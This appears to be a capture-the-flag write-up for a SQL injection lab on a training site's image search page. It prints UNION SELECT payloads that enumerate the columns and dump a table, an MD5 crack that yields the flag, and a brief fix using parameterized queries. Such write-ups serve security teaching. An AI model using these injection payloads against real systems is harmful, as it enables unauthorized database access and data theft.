# SQL INJECTION IMAGE

## The flag

```
THE FLAG IS : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to find it ?

On the page http://{IP_ADDRESS}/index.php?page=searchimg

- To get the request columns number
```
1 OR 1=1 UNION SELECT NULL, NULL--
> 2 columns
```

- To get the users columns names
```
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
> id, url, title, comment
```

- To see all user's data
```
1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
-> borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

- Finally "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
```
md5_decrypt('1928e8083cf461a51303633093573c46')
> albatroz
lower('albatroz')
> albatroz
sh256('albatroz')
> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to use it ?
Dump and get all database infos

## How to avoid it ?
> Always use parameterized statements in SQL request. If you can't, you must at least escaping inputs.

---

[RETURN](https://github.com/tillderoquefeuil/darkly)